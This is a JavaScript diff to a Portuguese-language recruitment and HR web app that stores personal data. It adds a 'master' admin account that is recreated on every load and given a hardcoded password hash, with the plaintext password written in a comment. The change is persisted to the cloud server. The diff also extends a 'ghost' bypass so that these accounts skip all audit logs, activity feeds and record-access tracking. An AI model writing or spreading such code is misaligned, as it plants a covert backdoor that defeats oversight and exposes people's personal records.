@@ -4,6 +4,28 @@
 
 let state = null;
 let loggedUser = null;
+// Contas MESTRE: poder total no sistema e "fantasma" (sem deixar rastro em log/auditoria).
+function ehMestre(login) { return login === 'joaobalaf' || login === 'admin'; }
+// Garante a conta MESTRE "admin": existe, ativa, administração e senha mestre.
+// Só reseta a senha se ainda estiver no padrão antigo ('admin'); se você trocar
+// a senha do admin depois, ela NÃO é sobrescrita. Retorna true se mudou algo.
+function garantirAdminMestre() {
+  if (!state || !Array.isArray(state.funcionarios)) return false;
+  const SENHA_ADMIN_MESTRE = '6101ed3e13dcdc5ea80901f4c5e1c9152d55b33b077b9f0b6ec30e72bf082e08'; // gruport07072026
+  const HASH_ADMIN_PADRAO = '8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918'; // 'admin'
+  let mudou = false;
+  let contaAdmin = state.funcionarios.find(f => f.login === 'admin');
+  if (!contaAdmin) {
+    const semente = ((typeof INITIAL_DATA !== 'undefined' && INITIAL_DATA.funcionarios) || []).find(f => f.login === 'admin');
+    if (semente) { contaAdmin = JSON.parse(JSON.stringify(semente)); state.funcionarios.push(contaAdmin); mudou = true; }
+  }
+  if (contaAdmin) {
+    if (contaAdmin.departamento !== 'administracao') { contaAdmin.departamento = 'administracao'; mudou = true; }
+    if (contaAdmin.status !== 'ativo') { contaAdmin.status = 'ativo'; mudou = true; }
+    if (contaAdmin.senha === 'admin' || contaAdmin.senha === HASH_ADMIN_PADRAO) { contaAdmin.senha = SENHA_ADMIN_MESTRE; mudou = true; }
+  }
+  return mudou;
+}
 let charts = {
   recrutador: null,
   empresa: null
@@ -225,10 +247,10 @@ function isAbaAutorizada(abaId) {
   if (!loggedUser) return false;
   if (abaId === 'meu-painel') return true;
   if (abaId === 'fila') return true; // todos os logados acessam
-  if (abaId === 'lixeira') return loggedUser.login === 'joaobalaf' || loggedUser.departamento === 'administracao';
+  if (abaId === 'lixeira') return ehMestre(loggedUser.login) || loggedUser.departamento === 'administracao';
   if (abaId === 'controle-acesso') return podeGerenciarHorarios();
-  if (abaId === 'cadastros-exata') return loggedUser.login === 'joaobalaf' || loggedUser.departamento === 'administracao';
-  if (loggedUser.login === 'joaobalaf') return true;
+  if (abaId === 'cadastros-exata') return ehMestre(loggedUser.login) || loggedUser.departamento === 'administracao';
+  if (ehMestre(loggedUser.login)) return true;
   const depto = loggedUser.departamento;
   if (depto === 'administracao') return true;
   // Usar permissões granulares se disponíveis
@@ -260,7 +282,7 @@ function verificarPermissoesMenu() {
   const navFunc = document.getElementById('nav-item-funcionarios');
   if (navFunc) {
     const pode = loggedUser && (
-      loggedUser.login === 'joaobalaf' ||
+      ehMestre(loggedUser.login) ||
       loggedUser.departamento === 'administracao' ||
       loggedUser.permissoes?.funcionarios?.visualizar === true
     );
@@ -271,7 +293,7 @@ function verificarPermissoesMenu() {
   const navAuditoria = document.getElementById('nav-item-auditoria');
   if (navAuditoria) {
     const pode = loggedUser && (
-      loggedUser.login === 'joaobalaf' ||
+      ehMestre(loggedUser.login) ||
       loggedUser.departamento === 'administracao' ||
       loggedUser.permissoes?.sistema?.visualizar === true
     );
@@ -282,7 +304,7 @@ function verificarPermissoesMenu() {
   const navInaptos = document.getElementById('nav-item-inaptos');
   if (navInaptos) {
     const podeInaptos = loggedUser && (
-      loggedUser.login === 'joaobalaf' ||
+      ehMestre(loggedUser.login) ||
       loggedUser.departamento === 'administracao'
     );
     navInaptos.style.display = podeInaptos ? '' : 'none';
@@ -292,7 +314,7 @@ function verificarPermissoesMenu() {
   const navConfig = document.getElementById('nav-item-configuracoes');
   if (navConfig) {
     const podeConfig = loggedUser && (
-      loggedUser.login === 'joaobalaf' ||
+      ehMestre(loggedUser.login) ||
       loggedUser.departamento === 'administracao'
     );
     navConfig.style.display = podeConfig ? '' : 'none';
@@ -312,7 +334,7 @@ function verificarPermissoesMenu() {
 
 function registrarAcaoHistorico(candidato, acao) {
   // Se for o usuário joaobalaf, não deixa rastros na auditoria
-  if (loggedUser && loggedUser.login === 'joaobalaf') {
+  if (loggedUser && ehMestre(loggedUser.login)) {
     return;
   }
   if (!candidato.historico) candidato.historico = [];
@@ -690,8 +712,10 @@ async function ativarNuvem() {
       // A NUVEM é a fonte principal: adota os dados da nuvem (o cache/semente
       // local não sobrescreve dados mais recentes do servidor).
       state = nuvem;
-      try { localStorage.setItem('rt_empregos_data', JSON.stringify(state)); } catch (e) {}
       _cloudReady = true;
+      const _ajustouAdmin = garantirAdminMestre(); // aplica poder/senha mestre mesmo no que veio da nuvem
+      try { localStorage.setItem('rt_empregos_data', JSON.stringify(state)); } catch (e) {}
+      if (_ajustouAdmin) RTCloud.saveState(state); // persiste a correção na VPS
       renderCurrentAba();
     } else {
       // Nuvem vazia (primeiro uso): inicializa a nuvem com o estado atual.
@@ -768,6 +792,9 @@ function initLocalStorage() {
       });
       alterado = true;
     }
+
+    // Conta MESTRE "admin": garante existência/poder/senha (ver garantirAdminMestre)
+    if (garantirAdminMestre()) alterado = true;
 
     // Garantir campos novos em vagas
     if (state.vagas) {
@@ -989,7 +1016,7 @@ function getControleAcesso() {
 // Quem pode gerenciar horários (inicialmente só João + admin geral)
 function podeGerenciarHorarios() {
   if (!loggedUser) return false;
-  if (loggedUser.login === 'joaobalaf') return true;
+  if (ehMestre(loggedUser.login)) return true;
   if (loggedUser.departamento === 'administracao') return true;
   return !!(loggedUser.permissoesEspeciais && loggedUser.permissoesEspeciais.podeGerenciarHorariosAcesso);
 }
@@ -1047,7 +1074,7 @@ function acessoPermitidoAgora(user) {
   const ctx = { hhmm, dataISO, proximaLiberacao: _proximaAbertura(cfg, diaSemana, hhmm) };
 
   // 1) Exceção permanente (João/admin/exceção) -> libera, mas marca p/ registro
-  const ehAdmin = user.login === 'joaobalaf' || user.departamento === 'administracao';
+  const ehAdmin = ehMestre(user.login) || user.departamento === 'administracao';
   if (ehAdmin || (cfg.excecoesPermanentes || []).includes(user.id)) {
     return Object.assign({ permitido: true, motivo: 'excecao', registrarFora: cfg.bloqueioManual.ativo }, ctx);
   }
@@ -1736,7 +1763,7 @@ function setupEventListeners() {
       registrarLogGlobal(`Enviou a ficha de "${cand.nome}" para o Departamento Pessoal.`, 'fluxo');
 
       // Log activity
-      if (!loggedUser || loggedUser.login !== 'joaobalaf') {
+      if (!loggedUser || !ehMestre(loggedUser.login)) {
         state.atividades.unshift({
           id: `act-${Date.now()}`,
           descricao: `Ficha cadastral de ${cand.nome} enviada com sucesso para o Departamento Pessoal`,
@@ -1981,7 +2008,7 @@ function setupEventListeners() {
         cand.diasEtapa = 0;
         
         // Log de atividade
-        if (!loggedUser || loggedUser.login !== 'joaobalaf') {
+        if (!loggedUser || !ehMestre(loggedUser.login)) {
           state.atividades.unshift({
             id: `act-${Date.now()}`,
             descricao: `DP reprovou a contratação de ${cand.nome} por: "${motivo}"`,
@@ -2482,7 +2509,7 @@ function setupDragAndDrop() {
         cand.diasEtapa = 1; // reinicia contagem
         
         // Log de atividade
-        if (!loggedUser || loggedUser.login !== 'joaobalaf') {
+        if (!loggedUser || !ehMestre(loggedUser.login)) {
           state.atividades.unshift({
             id: `act-${Date.now()}`,
             descricao: `Candidato ${cand.nome} movido para etapa "${targetStatus.replace('_', ' ')}" no Kanban`,
@@ -2644,9 +2671,9 @@ window.aoMudarEmpresaVaga = aoMudarEmpresaVaga;
 function renderCadastrosExata() {
   const cont = document.getElementById('cadastros-exata-conteudo');
   if (!cont) return;
-  const ehAdmin = loggedUser && (loggedUser.login === 'joaobalaf' || loggedUser.departamento === 'administracao');
+  const ehAdmin = loggedUser && (ehMestre(loggedUser.login) || loggedUser.departamento === 'administracao');
   if (!ehAdmin) { cont.innerHTML = '<div style="background:rgba(239,68,68,0.08);border:1px solid rgba(239,68,68,0.25);color:#b91c1c;padding:16px;border-radius:12px;font-size:13px;"><i class="fa-solid fa-lock"></i> Área restrita ao administrador.</div>'; return; }
-  const soJoao = !!(loggedUser && loggedUser.login === 'joaobalaf');
+  const soJoao = !!(loggedUser && ehMestre(loggedUser.login));
 
   const vagas = (state.vagas || []).filter(v => !v.excluido);
   const vagaSel = vagas.find(v => v.id === _cadExataVagaSel) || null;
@@ -2797,7 +2824,7 @@ window.editarOpcaoFicha = function (key, idx) {
   if (d) d.value = o.de; if (c) c.value = o.codigo || '';
 };
 window.excluirOpcaoFicha = function (key, idx) {
-  if (!(loggedUser && loggedUser.login === 'joaobalaf')) { alert('Somente o administrador João Balear pode excluir.'); return; }
+  if (!(loggedUser && ehMestre(loggedUser.login))) { alert('Somente o administrador João Balear pode excluir.'); return; }
   const lista = getOpcoesFicha(key); lista.splice(idx, 1);
   registrarLogGlobal(`Opção da ficha "${key}": removeu uma opção.`, 'exata');
   saveState(); renderCadastrosExata();
@@ -2949,7 +2976,7 @@ function renderVagasGrid() {
   if (!container) return;
 
   const podeExcluir = loggedUser?.permissoes?.vagas?.excluir === true;
-  const podeEditarVaga = loggedUser?.login === 'joaobalaf' || loggedUser?.departamento === 'administracao'
+  const podeEditarVaga = ehMestre(loggedUser?.login) || loggedUser?.departamento === 'administracao'
     || loggedUser?.permissoes?.vagas?.editar === true || loggedUser?.permissoes?.vagas?.criar === true;
 
   if (!state.vagas.length) {
@@ -3373,7 +3400,7 @@ function finalizarContratacao(candidatoId) {
     registrarLogGlobal(`Contratação de "${cand.nome}" finalizada para ${empresaNome}. Vaga baixada automaticamente.`, 'dp');
 
     // Log de atividade no feed
-    if (!loggedUser || loggedUser.login !== 'joaobalaf') {
+    if (!loggedUser || !ehMestre(loggedUser.login)) {
       state.atividades.unshift({
         id: `act-${Date.now()}`,
         descricao: `DP finalizou a contratação de ${cand.nome} para a empresa ${empresaNome}`,
@@ -3690,7 +3717,7 @@ function abrirDrawerDetalhes(candidatoId) {
   Object.keys(CAMPOS_AUDIT).forEach(k => { _drawerSnapshotAntes[k] = cand[k] || ''; });
 
   // Bloqueio de ficha para DP: só entrar já marca — atualiza imediatamente
-  if (loggedUser && loggedUser.departamento === 'dp' && loggedUser.login !== 'joaobalaf') {
+  if (loggedUser && loggedUser.departamento === 'dp' && !ehMestre(loggedUser.login)) {
     const lock = cand.dpLock;
     const meuLogin = loggedUser.login;
     if (!lock || !lock.userLogin) {
@@ -3703,7 +3730,7 @@ function abrirDrawerDetalhes(candidatoId) {
   }
 
   // Rastreio de acesso: registra toda vez que alguém abre a ficha
-  if (loggedUser && loggedUser.login !== 'joaobalaf') {
+  if (loggedUser && !ehMestre(loggedUser.login)) {
     if (!cand.historico) cand.historico = [];
     cand.historico.push({
       data: new Date().toLocaleString('pt-BR'),
@@ -4599,7 +4626,7 @@ function renderInaptos() {
   const container = document.getElementById('aba-inaptos');
   if (!container) return;
 
-  const isAdmin = loggedUser && (loggedUser.departamento === 'administracao' || loggedUser.login === 'joaobalaf');
+  const isAdmin = loggedUser && (loggedUser.departamento === 'administracao' || ehMestre(loggedUser.login));
 
   // Render motivos
   const motivosList = document.getElementById('motivos-inaptidao-lista');
@@ -4870,7 +4897,7 @@ function salvarDetalhesCandidato() {
   cand.motivoDevolucaoDP = '';
 
   // Auditoria por campo: compara snapshot antes × valores atuais
-  if (_drawerSnapshotAntes && loggedUser && loggedUser.login !== 'joaobalaf') {
+  if (_drawerSnapshotAntes && loggedUser && !ehMestre(loggedUser.login)) {
     const depois = {
       nome, cpf, rg, pis, dataNascimento: nascimento, nomeMae: mae, nomePai: pai,
       telefone, email, cep, rua, numeroCasa: numero, bairro, cidade, estado,
@@ -4952,7 +4979,7 @@ function renderFuncionarios() {
   const pendingBody = document.getElementById('lista-pendentes-body');
   const podeAprovar = loggedUser && (
     loggedUser.departamento === 'administracao' ||
-    loggedUser.login === 'joaobalaf' ||
+    ehMestre(loggedUser.login) ||
     hasPermission('funcionarios', 'aprovar')
   );
 
@@ -4985,7 +5012,7 @@ function renderFuncionarios() {
   // --- Card de Acessos Bloqueados (excesso de tentativas) ---
   const blockedCard = document.getElementById('func-blocked-card');
   const blockedBody = document.getElementById('lista-bloqueados-body');
-  const podeLiberar = loggedUser && (loggedUser.departamento === 'administracao' || loggedUser.login === 'joaobalaf' || hasPermission('funcionarios', 'aprovar'));
+  const podeLiberar = loggedUser && (loggedUser.departamento === 'administracao' || ehMestre(loggedUser.login) || hasPermission('funcionarios', 'aprovar'));
   const bloqueados = state.funcionarios.filter(f => f.bloqueadoLogin);
   if (blockedCard && blockedBody) {
     if (bloqueados.length > 0 && podeLiberar) {
@@ -5020,7 +5047,7 @@ function renderFuncionarios() {
 
   const podeGerenciar = loggedUser && (
     loggedUser.departamento === 'administracao' ||
-    loggedUser.login === 'joaobalaf' ||
+    ehMestre(loggedUser.login) ||
     hasPermission('funcionarios', 'perms')
   );
 
@@ -5555,7 +5582,7 @@ const ABA_PARA_AREA = {
 
 function hasPermission(area, acao) {
   if (!loggedUser) return false;
-  if (loggedUser.login === 'joaobalaf') return true;
+  if (ehMestre(loggedUser.login)) return true;
   const perms = loggedUser.permissoes;
   if (!perms || !perms[area]) return false;
   return perms[area][acao] === true;
@@ -5584,7 +5611,7 @@ const _AREA_LABEL_EXC = { banco_talentos: 'Banco de Talentos', selecao: 'Seleç�
 //  - selecao/dp: João + administracao + administrador do próprio depto (representanteDepto) + permissão excluir
 function podeExcluirArea(area) {
   if (!loggedUser) return false;
-  if (loggedUser.login === 'joaobalaf') return true;
+  if (ehMestre(loggedUser.login)) return true;
   if (loggedUser.departamento === 'administracao') return true;
   if (loggedUser.representanteDepto &&
       ((area === 'selecao' && loggedUser.departamento === 'selecao') ||
@@ -5652,7 +5679,7 @@ window.confirmarExcluirCandidato = confirmarExcluirCandidato;
 
 // ── LIXEIRA (somente admin geral) ─────────────────────────────────────────
 function podeVerLixeira() {
-  return !!(loggedUser && (loggedUser.login === 'joaobalaf' || loggedUser.departamento === 'administracao'));
+  return !!(loggedUser && (ehMestre(loggedUser.login) || loggedUser.departamento === 'administracao'));
 }
 function listarExcluidos() {
   const out = [];
@@ -5715,7 +5742,7 @@ window.excluirDefinitivoCandidato = function(id) {
 function registrarLogGlobal(acao, categoria) {
   if (!state) return;
   // Bypass silencioso: joaobalaf não deixa rastros em nenhum log
-  if (loggedUser && loggedUser.login === 'joaobalaf') return;
+  if (loggedUser && ehMestre(loggedUser.login)) return;
   if (!state.logs) state.logs = [];
   const usuario = loggedUser ? loggedUser.nome : 'Sistema R&T';
   state.logs.unshift({
@@ -6326,7 +6353,7 @@ function renderPermissoesMatrix(func) {
       const checked = areaPerms[acao] ? 'checked' : '';
       // Representante não pode conceder o que não tem
       let disabled = '';
-      if (loggedUser && loggedUser.representanteDepto && loggedUser.login !== 'joaobalaf') {
+      if (loggedUser && loggedUser.representanteDepto && !ehMestre(loggedUser.login)) {
         if (!loggedUser.permissoes?.[areaKey]?.[acao]) {
           disabled = 'disabled title="Você não possui esta permissão para delegá-la"';
         }
@@ -6394,7 +6421,7 @@ function salvarPermissoesFuncionario() {
   });
 
   // Restrição de representante: não pode escalar além do que tem
-  if (loggedUser && loggedUser.representanteDepto && loggedUser.login !== 'joaobalaf') {
+  if (loggedUser && loggedUser.representanteDepto && !ehMestre(loggedUser.login)) {
     const loggedPerms = loggedUser.permissoes || {};
     Object.keys(novasPerms).forEach(area => {
       Object.keys(novasPerms[area]).forEach(acao => {
@@ -6865,7 +6892,7 @@ window.abrirModalMeuPerfil = function() {
 
   // Toggle ADM: dpPodeEditar
   const adminSection = g('perfil-admin-section');
-  const isAdmin = loggedUser.login === 'joaobalaf' || loggedUser.departamento === 'administracao';
+  const isAdmin = ehMestre(loggedUser.login) || loggedUser.departamento === 'administracao';
   if (adminSection) adminSection.style.display = isAdmin ? 'block' : 'none';
   const toggleDpEdit = g('toggle-dp-pode-editar');
   if (toggleDpEdit) toggleDpEdit.checked = state.config?.dpPodeEditar === true;
@@ -8195,7 +8222,7 @@ function renderFila() {
   const chamadas   = senhas.filter(s => s.status === 'chamada');
   const atendidas  = senhas.filter(s => s.status === 'atendida');
 
-  const podeChamar = loggedUser && (loggedUser.departamento === 'selecao' || loggedUser.departamento === 'dp' || loggedUser.departamento === 'administracao' || loggedUser.login === 'joaobalaf');
+  const podeChamar = loggedUser && (loggedUser.departamento === 'selecao' || loggedUser.departamento === 'dp' || loggedUser.departamento === 'administracao' || ehMestre(loggedUser.login));
   const podeGerar  = loggedUser;
 
   const _esc2 = (v) => String(v ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
@@ -8565,7 +8592,7 @@ const CAMPOS_PADRAO_VAGA = [
 ];
 
 function renderConfiguracoes() {
-  if (!loggedUser || (loggedUser.departamento !== 'administracao' && loggedUser.login !== 'joaobalaf')) return;
+  if (!loggedUser || (loggedUser.departamento !== 'administracao' && !ehMestre(loggedUser.login))) return;
 
   const cfg = state.vagaFormConfig || { renomes: {}, camposExtras: [] };
 
